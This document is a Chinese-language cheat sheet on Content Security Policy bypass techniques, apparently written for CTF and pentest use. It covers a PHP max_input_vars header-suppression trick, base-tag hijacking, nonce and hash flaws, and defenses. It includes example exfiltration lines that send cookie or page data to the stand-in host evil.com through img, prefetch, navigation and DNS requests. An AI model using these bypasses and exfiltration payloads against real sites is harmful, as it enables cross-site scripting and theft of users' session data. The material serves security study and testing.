# CSP（Content Security Policy）绕过技术

> CSP 绕过技术速查。

---

## 1. CSP 基础回顾

CSP 通过 HTTP 响应头 `Content-Security-Policy` 告诉浏览器哪些资源可以加载/执行。

### 常见 CSP 指令

| 指令 | 作用 | 示例 |
|------|------|------|
| `default-src` | 所有类型的默认策略 | `'self'`（仅同源） |
| `script-src` | JavaScript 来源限制 | `'self' 'unsafe-inline'` |
| `img-src` | 图片来源限制 | `'self' data:` |
| `style-src` | 样式来源限制 | `'self' 'unsafe-inline'` |
| `connect-src` | fetch/XHR/WebSocket 目标限制 | `'self'` |
| `frame-src` | iframe 来源限制 | `'none'` |

### 关键字含义

| 关键字 | 含义 | 安全影响 |
|--------|------|---------|
| `'self'` | 同源 | 较安全 |
| `'unsafe-inline'` | 允许内联脚本/样式 | **危险**：XSS 可执行 |
| `'unsafe-eval'` | 允许 eval() | **危险**：代码注入 |
| `'none'` | 完全禁止 | 最安全 |
| `'nonce-xxx'` | 带 nonce 的脚本可执行 | 安全（nonce 不可预测时） |
| `'strict-dynamic'` | nonce 授权的脚本可动态加载更多 | 安全 |

---

## 2. CSP 绕过技术分类

### 2.1 让 CSP 头消失（不发送 CSP）

**原理**：如果响应中没有 CSP 头，浏览器不会执行任何限制。

#### 2.1.1 PHP max_input_vars 参数炸弹

**适用条件**：
- 目标是 PHP 应用
- PHP 配置了 CSP（在代码中设置，不是 Web 服务器层面）
- 请求处理流程中，CSP 设置发生在输入参数解析**之后**

**原理**：

PHP 的 `max_input_vars` 配置（默认 1000）限制了单次请求解析的输入变量数。当超过限制时：

1. PHP 只解析前 1000 个参数
2. 触发 `E_WARNING` 级别错误
3. WARNING 的输出导致 HTTP 响应头被提前发送
4. 后续设置 CSP 头的代码因 "headers already sent" 而失败
5. 响应中没有 CSP 头 → XSS 可正常执行

**参数计数规则**：

```
总参数 = GET 参数数 + POST 参数数 + Cookie 数
```

所有来源的参数都计入 `max_input_vars` 限制。

**CSP 在代码中的位置判断**：

```php
// 模式 1（可绕过）：CSP 在 PHP 代码开头设置，但在 max_input_vars 触发之后
<?php
// 此时已经解析了输入参数（$_GET/$_POST/$_COOKIE）
// 如果参数超过 1000，WARNING 已经触发了
header('Content-Security-Policy: default-src \'self\'; ...');  // ← 会失败！

// 模式 2（不可绕过）：CSP 在 Web 服务器层面设置
// nginx 配置：
add_header Content-Security-Policy "default-src 'self'" always;
// ← always 确保无论响应状态如何都发送 CSP，不受 PHP WARNING 影响
```

**关键判断**：查看 CSP 是在 PHP 代码中通过 `header()` 设置的（可绕过），还是在 nginx/Apache 配置中通过 `add_header` 设置的（不可绕过）。

**利用方法**：

```
正常请求: 1 cookie + 1 GET + 2 POST = 4 参数

攻击请求:
  POST /index.php?action=join-request
  Cookie: PHPSESSID=xxx            (1 个 cookie)
  GET: action=join-request         (1 个 GET)
  POST: csrf_token=xxx&content=XSS_PAYLOAD&j0=x&j1=x&...&j997=x
                                    (2 + 998 = 1000 个 POST)

  总计: 1 + 1 + 1000 = 1002 > 1000  ✓ 触发 WARNING
```

**关键点**：
- 重要的 POST 参数（如 csrf_token、content）要放在前面，确保在限制之内被正常解析
- 垃圾参数放在后面，它们只需要占位，不需要被解析
- 需要在**两个阶段**都触发：存储 payload 时 + Bot/受害者访问时
- **Bot URL 必须使用内部域名**：Docker 环境中 Bot 通过内部网络（如 `http://nginx`）访问，Cookie 的域也设置为内部域名。如果 Bot URL 使用外部地址，Cookie 不会被发送，XSS 读到的 `document.cookie` 为空

**防御**：
- 在 nginx/Apache 层面设置 CSP（不经过 PHP 处理）
- 使用 `add_header ... always;`（nginx）确保无论响应状态如何都发送 CSP
- 在 PHP 中尽早设置安全头（在输入解析之前）
- 生产环境关闭 `display_errors`

#### 2.1.2 其他让 CSP 头消失的方法

| 方法 | 原理 | 适用场景 |
|------|------|---------|
| PHP max_input_vars | 参数过多 → WARNING → headers already sent | PHP 应用 |
| 大文件上传/超长请求 | 请求体超过限制 → 错误处理可能提前输出 | 任何应用 |
| 触发未捕获异常 | 异常处理输出 → headers already sent | 错误处理不完善的应用 |
| HTTP/2 降级 | 某些代理在协议降级时丢弃头部 | 有反向代理的场景 |
| 路径混淆 | `/path/..%2f/../page` 某些中间件可能跳过头设置 | 有中间件的应用 |

### 2.2 利用 CSP 配置缺陷

#### 2.2.1 script-src 允许不安全域

**检查**：`script-src` 中是否包含：
- `*.cloudflare.com` / `*.googleapis.com` → 可能有 JSONP 端点
- `*.cdn.jsdelivr.net` → 可以上传恶意包
- `*.wordpress.org` → JSONP 端点

**利用**：在允许的域上找到可以返回任意 JavaScript 的端点（JSONP、托管服务等）。

#### 2.2.2 'unsafe-inline' 或 'unsafe-eval'

直接允许内联脚本或 eval，XSS 不需要绕过。

#### 2.2.3 base 标签劫持

**适用条件**：CSP 中没有 `base-uri` 限制（很多开发者会遗漏）。

**利用**：
```html
<base href="https://evil.com/">
<script src="/ legit-script.js"></script>
<!-- 浏览器会从 evil.com 加载 legit-script.js -->
```

#### 2.2.4 object/embed 标签

**适用条件**：CSP 中没有 `object-src` 限制（或设为 `'self'`）。

**利用**：嵌入 Flash/PDF 等插件执行 JavaScript。

### 2.3 利用 nonce/hash 实现缺陷

| 缺陷 | 检测方法 | 利用 |
|------|---------|------|
| nonce 可预测 | 对比多次响应的 nonce 值 | 预测下一次的 nonce |
| nonce 在 URL 中暴露 | nonce 是否出现在 URL/Referer 中 | 通过 Referer 泄露获取 nonce |
| 固定 hash | `script-src 'sha256-xxx'` | 如果 hash 对应的脚本内容可控 |
| nonce 被注入到攻击者控制的 script | 页面上是否有注入点可以创建 script 标签 | XSS 注入 `<script nonce="stolen">` |

#### 2.3.5 CSP 脚本哈希防篡改与绕过

**原理**：`script-src 'sha256-xxx'` 中 `xxx` 是 `<script>` 标签内容的 Base64 编码 SHA256 哈希。浏览器在执行内联脚本前计算脚本内容的哈希，与 CSP 声明的不匹配则拒绝执行。

**场景**：CTF 题或安全加固的页面使用哈希 CSP 防止修改脚本内容。当你修改了 HTML 文件中的脚本（哪怕改一个字符），浏览器控制台报错 `Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'sha256-...'"`。

**检测方法**：
1. 查看 `<meta http-equiv="Content-Security-Policy">` 标签或 HTTP 响应头中 `script-src` 是否包含 `'sha256-'`
2. 修改 HTML 后刷新，看浏览器控制台是否报 CSP 违规

**绕过方法**：

| 方法 | 适用场景 | 操作 |
|------|---------|------|
| 去掉 CSP content 属性 | `<meta>` 标签声明 CSP | `<meta http-equiv="Content-Security-Policy" id="c">` — 去掉 content 属性 |
| 中间人修改响应头 | 可控代理/本地文件 | 用 Burp/mitmproxy 删除 CSP 响应头 |
| 保持 `'unsafe-eval'` | CSP 同时允许 eval | 通过 `eval()` / `Function()` 执行修改后的代码，不受哈希校验 |
| 重新计算哈希 | 可修改 CSP 声明本身 | `echo -n '脚本内容' \| openssl dgst -sha256 -binary \| base64` 得到新哈希，更新 CSP |

**注意**：如果 CSP 通过 `<meta>` 标签声明且该标签有 `id`，代码可能通过 `document.getElementById()` 读取它，去掉 content 属性后，相关代码读到的值为空字符串，去掉前先检查代码是否依赖这个值（如判断 CSP 策略是否存在），如果依赖则需要保留一个无害、能通过验证的值。

### 2.4 利用其他资源类型绕过

即使 `script-src` 很严格，也可以通过其他资源类型外泄数据：

| 资源类型 | CSP 指令 | 外泄方式 |
|---------|---------|---------|
| CSS | `style-src` | CSS exfiltration（属性选择器 + 背景 URL） |
| 图片 | `img-src` | `<img src="https://evil.com/?data=xxx">` |
| 链接预加载 | `prefetch-src` / `default-src` | `<link rel="prefetch" href="https://evil.com/?data=xxx">` |
| 导航 | `navigate-to`（很少设置） | `location.href = "https://evil.com/?data=xxx"` |
| DNS | 无 CSP 限制 | DNS exfiltration（`new Image().src = 'http://'+data+'.evil.com'`），或用 `document.cookie` 中每个字符构造 DNS 查询 |

---

## 3. CSP 绕过检查流程

当发现目标有 CSP 保护时，按以下顺序检查：

```
1. 解析 CSP 策略
   ├── 列出所有指令及其值
   └── 标记缺失的指令（缺失 = 无限制）

2. 检查是否能"让 CSP 消失"
   ├── 是否 PHP 应用？→ 测试 max_input_vars 参数炸弹
   ├── 是否有异常触发点？→ 测试触发异常后 CSP 是否消失
   └── CSP 是在代码层还是 Web 服务器层设置的？

3. 检查 CSP 配置缺陷
   ├── script-src 是否有 'unsafe-inline' / 'unsafe-eval'？
   ├── script-src 是否包含可控外部域？
   ├── base-uri 是否限制？
   ├── object-src 是否限制？
   └── 是否有缺失的指令（如 navigate-to、prefetch-src）？

4. 检查 nonce/hash 实现
   ├── nonce 是否可预测？
   ├── nonce 是否通过 URL/Referer 泄露？
   └── hash 对应的脚本是否可控？

5. 考虑替代外泄方式
   ├── 即使 XSS 无法执行脚本，能否通过 CSS/图片/导航外泄？
   └── DNS exfiltration（完全不受 CSP 限制）
```

---

## 4. 常见组合攻击链

| 攻击链 | CSP 相关步骤 | 案例 |
|--------|-------------|------|
| XSS + CSP 绕过（max_input_vars） | 参数炸弹 → CSP 消失 → XSS 执行 | SnailNet |
| XSS + JSONP | 找允许域的 JSONP → 加载恶意 JS | 通用 |
| XSS + base 标签 | base-uri 未限制 → 劫持脚本加载源 | 通用 |
